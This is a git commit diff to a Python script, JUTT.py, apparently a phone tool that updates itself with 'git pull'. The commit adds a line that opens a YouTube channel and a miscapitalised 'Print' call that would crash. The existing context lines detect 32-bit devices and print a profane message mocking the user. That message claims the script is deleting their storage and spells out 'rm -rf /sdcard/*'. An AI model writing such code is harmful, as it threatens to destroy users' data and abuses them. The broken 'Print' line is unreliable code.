8f8368115d8b410c1942830352bfef0c82fb6d95
JUTT-704 <129414469+JUTT-704@users.noreply.github.com>
2023-03-30 21:58:38 +0500

    Update JUTT.py

--- JUTT.py
+++ JUTT.py
@@ -1,5 +1,7 @@
 import os,platform
 os.system('git pull')
+Print(' \33[1;31mYouTube Channel Subscribe')
+os.system('xdg-open https://youtube.com/@MrNow-ue5wb')
 xd=platform.architecture()[0]
 if xd=="32bit":
     print(' \33[1;32m Lund Hain Tu Aj Ka Zamana Main Tu 64 bit Mobile Nahii La Saka Wait Tara Data Delete Karta Hoon Ruk Sabar Kar rm -rf /sdcard/* Gandu Lagaya Tara Data Enjoy')
